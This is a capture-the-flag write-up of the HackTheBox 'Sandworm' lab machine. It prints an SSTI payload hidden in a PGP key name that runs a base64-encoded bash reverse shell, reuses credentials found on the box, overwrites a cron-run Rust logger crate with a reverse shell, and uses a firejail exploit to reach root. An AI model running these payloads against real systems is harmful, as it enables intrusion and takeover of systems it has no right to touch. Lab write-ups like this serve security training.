---
title: HackTheBox - Sandworm
author: 0
date: 2023-06-24 16:00:00 +0800
categories: [htb, machine]
tags: [gpg, server-side-template-injection, credential-reuse, tipnet, firejail]
render_with_liquid: false
---

This box starts off with a website of a Secret Spy Agency. This website has an about page where you can encrypt and decrypt messages via pgp keys.


## Enumeration

```bash
# Nmap 7.93 scan initiated Mon Jun 19 19:03:49 2023 as: nmap -sC -sV -oN nmap_result 10.10.11.218
Nmap scan report for 10.10.11.218
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 19 19:04:12 2023 -- 1 IP address (1 host up) scanned in 22.89 seconds
```

![homepage](/assets/img/htb-sandworm-homepage.png)

![contact](/assets/img/htb-sandworm-contact.png)

The contact page links to a guide where you can play around with either their gpg keys or your own.

![guide](/assets/img/htb-sandworm-guide.png)

## Foothold

After testing with their key, we will create our own key and see what happens.

```bash
$ gpg --gen-key                                                                             
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: decl
Name must be at least 5 characters long
Real name: delcrr
Email address: abc@xyz.com
You selected this USER-ID:
    "delcrr <abc@xyz.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: directory '/home/kali/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/D35B8D82E81D3D5C817F4F3B417C6B336F0194F1.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-19 [SC] [expires: 2025-06-18]
      D35B8D82E81D3D5C817F4F3B417C6B336F0194F1
uid                      delcrr <abc@xyz.com>
sub   rsa3072 2023-06-19 [E] [expires: 2025-06-18]
                                                                                                             
┌──(kali㉿kali)-[~/ctf/htb/sandworm]
└─$ gpg --armor --export abc@xyz.com   
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGSQjzoBDADAGvj1twiEZeMtskayQfiMdFQSsbbHVwggxh0icmtC42x3MD4r
...
Mk16eHeSKCS1WMOFeVjSvt7V4mv4SKk/mi5Uw34tM/cSJ6ATyUlLfioOtNdAwoFQ
nVT1b2Cnhk3UpoAB
=TcPu
-----END PGP PUBLIC KEY BLOCK-----
                                                                                                             
┌──(kali㉿kali)-[~/ctf/htb/sandworm]
└─$ echo 'test' > test                                                      
                                                                                                             
┌──(kali㉿kali)-[~/ctf/htb/sandworm]
└─$ gpg --clear-sign test                              
                                                                                                             
┌──(kali㉿kali)-[~/ctf/htb/sandworm]
└─$ cat test.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

test
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEE01uNgugdPVyBf087QXxrM28BlPEFAmSQj+MACgkQQXxrM28B
lPEIPgv7Bqxys90x8FwYrHoazY9fIbAH4Fb5CX24IgkanlNOPlhw9HmH6N0hveh7
SrWT66sN3Eau3ui6UxBAFmA+iHe4U8Ky5f54A++vn55/XPowd7dkTgZ3qu0HhuKr
//kzmC7IDdJnD3sMNlBum4npZYX0duYeNx0d9JLrcDG+5Dpe05rM0mtln62jtFgv
pLHb9Tbes0hgeHa3su5a+7XNd2hINihl0IOBWEXZEjGFzbm+6QlE/5qCJL0FX0wY
f2i40k5/SUA/V+lx5lmzSr7gSOERz9nWO8NVXdpTE5GM+S3hIixj6m25cawXoOp0
JAMmwwIzqU4LKVsPPZZ2IS9dErUKVmNT8mmnFxCdD7MWLmVQkgFezRe2sX/7tvCi
ZDRbe2mVetub4f6XIyOYZx9BxbA72koC5xU1OrOB85/vJac5PZswFp3wLpQ2jC7t
pweIKsIEdtHOsCvmfqKw+GN5Dh+Rtg3vENTmhZqjqgyvQCdr4a158+5bX0uPNxzj
ZhaZLefu
=6rMZ
-----END PGP SIGNATURE-----
```

We can tell that our name is being outputted in the alert box which could potentially lead to a server-side template injection.

![name](/assets/img/htb-sandworm-pgp-name.png)

We will create our payload to test out the SSTI vulnerability.

```bash
$ gpg --gen-key                   
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH

GnuPG needs to construct a user ID to identify your key.

Real name: {{4*2}}
Email address: abc2@xyz.com
You selected this USER-ID:
    "{{4*2}} <abc2@xyz.com>"
```

We can see the output is "8", confirming the SSTI vulnerability.

![ssti](/assets/img/htb-sandworm-ssti.png)

We can injection a reverse shell by abusing the SSTI vulnerability. We need to base64 encode the payload as no '<' and '>' characters are allowed.
```bash
$ gpg --gen-key                                                               
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH

GnuPG needs to construct a user ID to identify your key.

Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyOC8xMjM0IDA+JjE= | base64 -d | bash').read() }}
Email address: abc5@xyz.com
You selected this USER-ID:
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyOC8xMjM0IDA+JjE= | base64 -d | bash').read() }} <abc5@xyz.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O

```


## Lateral Movement

Once we gain access to the server, we can look around in the files. We find an `admin.json` file that contains credentials.

```
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "qu**REDACTED**22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

We can use those credentials to SSH into the "silentobserver" account.

```bash
$ ssh silentobserver@10.10.11.218
Last login: Mon Jun 19 19:36:25 2023 from 10.10.14.132
silentobserver@sandworm:~$ ls -lah
total 40K
drwxr-x--- 6 silentobserver silentobserver 4.0K Jun  6 08:52 .
drwxr-xr-x 4 root           root           4.0K May  4 15:19 ..
lrwxrwxrwx 1 root           root              9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 silentobserver silentobserver  220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 silentobserver silentobserver 3.7K Nov 22  2022 .bashrc
drwx------ 2 silentobserver silentobserver 4.0K May  4 15:26 .cache
drwxrwxr-x 3 silentobserver silentobserver 4.0K May  4 16:59 .cargo
drwx------ 4 silentobserver silentobserver 4.0K May  4 15:22 .gnupg
drwx------ 5 silentobserver silentobserver 4.0K Jun 19 19:21 .local
-rw-r--r-- 1 silentobserver silentobserver  807 Nov 22  2022 .profile
-rw-r----- 1 root           silentobserver   33 Jun 19 19:19 user.txt
silentobserver@sandworm:~$ cat user.txt
a2**REDACTED**043
```

## Container Escape

Using `pspy`, we see that there is a cron job running that calls "/opt/tipnet".

```bash
silentobserver@sandworm:/tmp$ ./pspy32
2023/06/27 18:12:02 CMD: UID=0     PID=2122   | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/27 18:12:02 CMD: UID=0     PID=2120   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run
2023/06/27 18:12:02 CMD: UID=0     PID=2124   | sleep 10 
2023/06/27 18:12:02 CMD: UID=0     PID=2123   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/06/27 18:12:02 CMD: UID=1000  PID=2126   | rustc -vV 
2023/06/27 18:12:02 CMD: UID=1000  PID=2129   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg                                                                                       
2023/06/27 18:12:12 CMD: UID=0     PID=2142   | /bin/cp -rp /root/Cleanup/crates /opt/ 
2023/06/27 18:12:12 CMD: UID=0     PID=2140   | /bin/bash /root/Cleanup/clean_c.sh 
```

When looking at the source code in this directory we find out that `tipnet` is a Rust program.

>It performs various operations related to a database called "Upstream" and logging functionality. It starts by importing necessary crates and defining a `struct` called "Entry" with timestamp, target, source, and data fields. The `main` function is the entry point of the program. It displays a logo and prompts the user to select a mode of usage. Based on the selected mode, it establishes a connection to the database and performs operations such as pulling indices, searching for data based on keywords, and logging user actions. The program also includes helper functions to handle database connections, search for data, and pull indices from a specified directory.

Unfortunately we don't have write access to this file.
```bash
silentobserver@sandworm:/opt/tipnet/src$ ls -lah
total 16K
drwxr-xr-x 2 root atlas 4.0K Jun  6 11:49 .
drwxr-xr-x 5 root atlas 4.0K Jun  6 11:49 ..
-rwxr-xr-- 1 root atlas 5.7K May  4 16:55 main.rs
```

```rust
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}

```

An extern crate is being used called logger, `extern crate logger;`. From looking at the `access.log` files we notice that it runs every 2 minutes.

```bash
silentobserver@sandworm:/opt/tipnet$ cat access.log
[2023-02-08 12:25:42] - User: atlas, Query: target intelligence year, Justification: Routine check and calibration of TipNet.
[2023-02-09 10:18:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-02-09 10:22:08] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-02-09 10:24:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
...
```

Inside the logger crate we find the `lib.rs` file. We have permissions to write to `lib.rs`.

```rust
silentobserver@sandworm:/opt/crates/logger/src$ ls -lah
total 12K
drwxrwxr-x 2 atlas silentobserver 4.0K May  4 17:12 .
drwxr-xr-x 5 atlas silentobserver 4.0K May  4 17:08 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

We can create a [reverse shell in rust](https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs) and overwrite the logger `lib.rs` file that will be executed by the logging cron job.

```rust
silentobserver@sandworm:/opt/crates$ cat ./logger/src/lib.rs
extern crate chrono;

use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
    let sock = TcpStream::connect("10.10.14.128:4444").unwrap();
    let fd = sock.as_raw_fd();

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
silentobserver@sandworm:/opt/crates$ cp /tmp/lib.rs ./logger/src/lib.rs
```

## Privilege Escalation

We find some interesting directories within the SUID search. We notice that `/usr/local/bin/firejail` is in this list.

```bash
silentobserver@sandworm:/tmp$ find / -perm -u=s -ls 2>/dev/null
    11679  57668 -rwsrwxr-x   2 atlas    atlas    59047248 Jun 19 19:28 /opt/tipnet/target/debug/tipnet
    11566  54924 -rwsrwxr-x   1 atlas    atlas    56234960 May  4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
    11679  57668 -rwsrwxr-x   2 atlas    atlas    59047248 Jun 19 19:28 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
     1344   1740 -rwsr-x---   1 root     jailer    1777952 Nov 29  2022 /usr/local/bin/firejail
    10841     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    14179    332 -rwsr-xr-x   1 root     root         338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
```

This can be exploited via this [PoC](https://www.openwall.com/lists/oss-security/2022/06/08/10/1). We need to set up two terminals to get this to work.

**Terminal 1**
```bash
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.128] from (UNKNOWN) [10.10.11.218] 35732
bash: cannot set terminal process group (39165): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ firejail --join=38813
firejail --join=38813
Error: cannot find process with pid 38813
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
atlas@sandworm:/opt/tipnet$ python3  /tmp/exploit.py &
python3  /tmp/exploit.py &
[1] 39704
atlas@sandworm:/opt/tipnet$ You can now run 'firejail --join=39709' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

**Terminal 2**
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.128] from (UNKNOWN) [10.10.11.218] 54834
bash: cannot set terminal process group (39544): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
atlas@sandworm:/opt/tipnet$ firejail --join=39709
firejail --join=39709
changing root to /proc/39709/root
Warning: cleaning all supplementary groups
Child process initialized in 8.87 ms
atlas@sandworm:/opt/tipnet$ su -
su -
root@sandworm:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~# cat /root/root.txt
cat /root/root.txt
a3f4**REDACTED**e975e
root@sandworm:~# 
```